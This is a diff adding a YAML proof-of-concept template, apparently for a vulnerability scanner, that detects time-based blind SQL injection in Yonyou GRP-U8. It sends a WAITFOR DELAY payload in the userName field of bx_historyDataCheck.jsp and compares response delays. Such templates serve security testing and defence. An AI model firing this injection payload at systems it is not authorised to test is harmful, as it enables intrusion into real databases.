@@ -1,0 +1,48 @@
+name: yaml-poc-yonyou-yonyou_grp_u8-sql_injection-CT-893849
+binding: da478c25-bb79-431d-a241-8d61850bf446
+detail:
+    author: socat
+    vulnerability:
+        id: 39c1e69a-ee6b-4c80-b740-644710182f5f
+        level: high
+    warning: Harmless
+transport: http
+set:
+    sleepSecond1: randomInt(3, 5)
+    sleepSecond2: randomInt(6, 8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /u8qx/bx_historyDataCheck.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                userName=';WAITFOR DELAY '0:0:0'--&class.module.classLoader.DefaultAssertionStatus=
+        expression: response.status == 200 && response.headers["Content-Type"].contains("text/html")
+        output:
+            r0latency: response.latency
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /u8qx/bx_historyDataCheck.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                userName=';WAITFOR DELAY '0:0:{{sleepSecond1}}'--&class.module.classLoader.DefaultAssertionStatus=
+            read_timeout: "10"
+        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /u8qx/bx_historyDataCheck.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                userName=';WAITFOR DELAY '0:0:{{sleepSecond2}}'--&class.module.classLoader.DefaultAssertionStatus=
+            read_timeout: "10"
+        expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000
+expression: r0() && r1() && r2()
